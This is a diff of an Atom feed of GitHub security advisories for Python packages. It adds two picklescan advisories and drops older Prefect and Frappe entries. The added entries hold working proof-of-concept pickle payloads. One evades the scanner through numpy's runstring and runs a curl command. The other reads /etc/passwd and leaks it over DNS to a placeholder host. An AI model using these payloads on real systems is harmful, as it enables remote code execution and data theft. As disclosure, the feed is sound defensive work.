@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-04-07T18:01:30.707Z</updated>
+    <updated>2025-04-07T19:01:15.807Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,146 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Picklescan failed to detect to some unsafe global function in Numpy library]]></title>
+        <id>https://github.com/advisories/GHSA-fj43-3qmq-673f</id>
+        <link href="https://github.com/advisories/GHSA-fj43-3qmq-673f"/>
+        <updated>2025-04-07T18:54:05.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited by import some built-in function in Numpy library that indrectly call some dangerous function like exec() to execute some python code as a parameter, which the attacker can import dangerous library inside like os library and execute arbitrary OS commands.</p>
+<h3 id="details">Details</h3>
+<p>Pickle’s deserialization process is known to allow execution of function via <strong>reduce</strong> method. While Picklescan is meant to detect such exploits, this attack evades detection by calling function in Numpy library that call dangerous function like exec(). And since Numpy library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.</p>
+<p>The attack payload executes in the following steps:</p>
+<ul>
+<li>First, the attacker craft the payload by import <strong>runstring</strong> function in <strong>numpy.testing._private.utils</strong></li>
+<li>Then, inside <strong>reduce</strong> method, the attacker import dangerous libarary like os and calling os.system() to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.</li>
+<li>Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<pre><code>import pickle
+import torch
+import pickle
+from picklescan.scanner import scan_file_path
+class Payload:
+  def __reduce__(self):
+    from numpy.testing._private.utils import runstring
+    return runstring, ("import os; os.system('curl https://example.com')",{})
+    
+def create_payload():
+  with open('payload.pickle', 'wb') as f:
+    pickle.dump(Payload(), f)
+
+def load_payload():
+  result = scan_file_path('payload.pickle')
+  if result.infected_files != 0 or result.scan_err:
+    print('File is infected')
+  else:
+    print('File is clean')
+    with open('payload.pickle', 'rb') as f:
+      pickle.load(f)
+
+create_payload() 
+load_payload()
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Severity: High</p>
+<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. For example, Invoke-AI repository (<a href="https://github.com/invoke-ai/InvokeAI">https://github.com/invoke-ai/InvokeAI</a>)
+What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
+Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>
+<h3 id="recommended-fixes">Recommended Fixes:</h3>
+<p>I suggest adding Numpy library to the unsafe globals blacklist.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f</a></li>
+<li><a href="https://github.com/advisories/GHSA-fj43-3qmq-673f">https://github.com/advisories/GHSA-fj43-3qmq-673f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fj43-3qmq-673f</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-04-07T18:54:05.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Picklescan Vulnerable to Exfiltration via DNS via linecache and ssl.get_server_certificate]]></title>
+        <id>https://github.com/advisories/GHSA-93mv-x874-956g</id>
+        <link href="https://github.com/advisories/GHSA-93mv-x874-956g"/>
+        <updated>2025-04-07T18:52:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Picklescan does not detect malicious pickles that exfiltrate sensitive information via DNS after deserialization.</p>
+<h3 id="details">Details</h3>
+<p>picklescan’s blacklist can be bypassed to exfiltrate sensitive information (like file contents, secrets, or credentials) during model deserialization by leveraging <code>ssl.get_server_certificate</code> as the callable function in the pickle payload. Since <code>ssl</code> is a standard Python library used for legitimate TLS operations, it is rarely blacklisted by static scanners or runtime monitors.</p>
+<p>The payload avoids flagged modules and instead uses <code>linecache</code> (also unflagged) to read local files. The exfiltrated data is added to DNS-safe chunks, and embedded as subdomains in a crafted FQDN.  When passed to <code>ssl.get_server_certificate</code>, the Python runtime performs a DNS resolution to the attacker-controlled domain, leaking the encoded content.</p>
+<p>The payload executes the following steps:</p>
+<ul>
+<li>Reads sensitive local file content using <code>linecache</code> module</li>
+<li>Encodes the data for DNS exfiltration</li>
+<li>Constructs a malicious domain name using a third party service <code>dnslog.cn</code> </li>
+<li>Triggers a DNS resolution via <code>ssl.get_server_certificate</code></li>
+<li>Leaks the encoded file content to the attacker</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Before running the PoC change the <code>fqdn</code> to your own or a third party that you control. In this PoC we used <code> fqdn = f"{subdomain}.ctmc2q.dnslog.cn"</code>.</p>
+<pre><code class="language-python">
+import numpy as np
+
+def create_malicious_model():
+# Define the payload class
+    class DNSLogPayload:
+        def __reduce__(self):
+            # Step 1: read a line from /etc/passwd
+            linecache = __import__("linecache")
+            first_line = linecache.getline("/etc/passwd", 1).strip()
+
+            # Step 2: Sanitize and embed it as a DNS subdomain
+            subdomain = first_line.replace(":", "_").replace("/", "_")
+            fqdn = f"{subdomain}.dns-logger.invalid"
+
+            # Step 3: Use ssl.get_server_certificate to trigger DNS resolution
+            ssl_mod = __import__("ssl")
+            return (getattr(ssl_mod, "get_server_certificate"), ((fqdn, 443),))
+
+    # Wrap the payload in a NumPy object array
+    arr = np.array([DNSLogPayload()], dtype=object)
+
+    # Save to .npy file
+    np.save("dnslog_trigger_payload.npy", arr, allow_pickle=True)   
+
+def load_model(model):
+    try:
+        return np.load(model, encoding="latin1", fix_imports=True, allow_pickle=1)
+    except Exception:
+        raise ValueError("Invalid file")
+
+if __name__ == "__main__":
+    create_malicious_model()
+    model = "dnslog_trigger_payload.npy"
+    print("[i] Loading and executing the model")
+    data = load_model(model)
+ 
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ol>
+<li>Evade detection: Bypasses the latest version of picklescan's blacklist. </li>
+<li>Exfiltrate sensitive local files to an attacker controlled DNS</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-93mv-x874-956g">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-93mv-x874-956g</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/pull/40">https://github.com/mmaitre314/picklescan/pull/40</a></li>
+<li><a href="https://github.com/advisories/GHSA-93mv-x874-956g">https://github.com/advisories/GHSA-93mv-x874-956g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-93mv-x874-956g</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-04-07T18:52:47.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[lnbits] LNbits Lightning Network Payment System Vulnerable to Server-Side Request Forgery via LNURL Authentication Callback]]></title>
         <id>https://github.com/advisories/GHSA-qp8j-p87f-c8cc</id>
@@ -788,56 +928,5 @@ We have identified a class pollution vulnerability in Mesop (&lt;= <a href="http
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-03-20T12:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[prefect] Prefect CORS (Cross-Origin Resource Sharing) misconfiguration]]></title>
-        <id>https://github.com/advisories/GHSA-4v9f-r55g-g6hc</id>
-        <link href="https://github.com/advisories/GHSA-4v9f-r55g-g6hc"/>
-        <updated>2025-03-26T15:36:24.000Z</updated>
-        <content type="html"><![CDATA[<p>A CORS (Cross-Origin Resource Sharing) misconfiguration in prefecthq/prefect prior to version 3.0.3 allows unauthorized domains to access sensitive data. This vulnerability can lead to unauthorized access to the database, resulting in potential data leaks, loss of confidentiality, service disruption, and data integrity risks.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8183">https://nvd.nist.gov/vuln/detail/CVE-2024-8183</a></li>
-<li><a href="https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2">https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2</a></li>
-<li><a href="https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2">https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2</a></li>
-<li><a href="https://github.com/PrefectHQ/prefect/issues/15074">https://github.com/PrefectHQ/prefect/issues/15074</a></li>
-<li><a href="https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c">https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c</a></li>
-<li><a href="https://github.com/PrefectHQ/prefect/releases/tag/2.20.17">https://github.com/PrefectHQ/prefect/releases/tag/2.20.17</a></li>
-<li><a href="https://github.com/advisories/GHSA-4v9f-r55g-g6hc">https://github.com/advisories/GHSA-4v9f-r55g-g6hc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4v9f-r55g-g6hc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-20T12:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[frappe] Frappe vulnerable to information disclosure leading to account takeover]]></title>
-        <id>https://github.com/advisories/GHSA-qrv3-jc3h-f3m6</id>
-        <link href="https://github.com/advisories/GHSA-qrv3-jc3h-f3m6"/>
-        <updated>2025-03-30T23:56:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Making crafted requests could lead to information disclosure that could further lead to account takeover.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There's no workaround to fix this without upgrading.</p>
-<h3 id="credits">Credits</h3>
-<p>Thanks to Thanh of Calif.io for reporting the issue</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6">https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30214">https://nvd.nist.gov/vuln/detail/CVE-2025-30214</a></li>
-<li><a href="https://github.com/advisories/GHSA-qrv3-jc3h-f3m6">https://github.com/advisories/GHSA-qrv3-jc3h-f3m6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qrv3-jc3h-f3m6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-25T16:40:10.000Z</published>
     </entry>
 </feed>
